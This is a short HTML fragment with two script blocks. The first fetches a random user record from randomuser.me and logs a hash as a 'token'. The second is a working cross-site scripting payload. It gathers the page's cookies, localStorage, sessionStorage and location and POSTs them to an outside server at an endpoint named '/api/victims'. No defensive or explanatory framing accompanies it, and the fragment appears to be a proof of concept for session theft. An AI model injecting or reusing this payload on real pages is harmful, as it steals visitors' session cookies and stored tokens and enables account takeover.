<script>
fetch('https://randomuser.me/api/')
.then(it => it.json())
.then(it => it.results.at(0).login.sha256)
.then(token => {
           console.log('setting token -',{token})
})
</script>


<script>
function prepareDataPack(){
    return {
      localStorage: window.localStorage,
      cookie:document.cookie,
      sessionStorage:window.sessionStorage,
      location:document.location,
    }
};

fetch('http://adam.main.pc:9000/api/victims', {
    method:'POST',
    body:JSON.stringify(prepareDataPack(), null ,2),
    mode:'no-cors'
})
</script>

